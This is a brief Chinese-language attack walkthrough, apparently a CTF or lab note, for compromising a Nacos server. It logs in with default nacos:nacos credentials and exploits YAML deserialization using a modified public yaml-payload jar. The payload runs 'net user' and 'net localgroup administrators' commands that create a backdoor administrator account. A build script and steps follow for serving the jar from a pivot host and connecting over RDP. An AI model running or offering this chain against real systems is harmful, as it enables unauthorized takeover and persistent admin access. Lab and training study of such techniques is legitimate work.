Nacos

8848 端口，访问 /nacos

NacosExploit 扫一下

先用 nacos:nacos 登录进去

得到 dataid 为 db-config

存在 yaml 反序列化，需要准备恶意 jar： https://github.com/Y4er/yaml-payload/tree/master

修改 AwesomeScriptEngineFactory 类里执行的命令为添加用户

Runtime.getRuntime().exec("net user wmc qwer1234! /add");
Runtime.getRuntime().exec("net localgroup administrators wmc /add");

然后编译

#!/bin/bash

# 1. 删除旧的编译文件
rm -f src/artsploit/*.class

# 2. 编译所有的 java 文件
javac -cp "./lib/*" src/artsploit/*.java

# 3. 重新打包（只挑选 .class 文件和 META-INF 目录）
cd src
jar -cvf ../yaml-payload.jar artsploit/*.class META-INF/
cd ..

接下来把 jar 包传到 Shiro 机器上，用 python3 起 http 服务打 yaml

接下来直接 rdp 上去就行
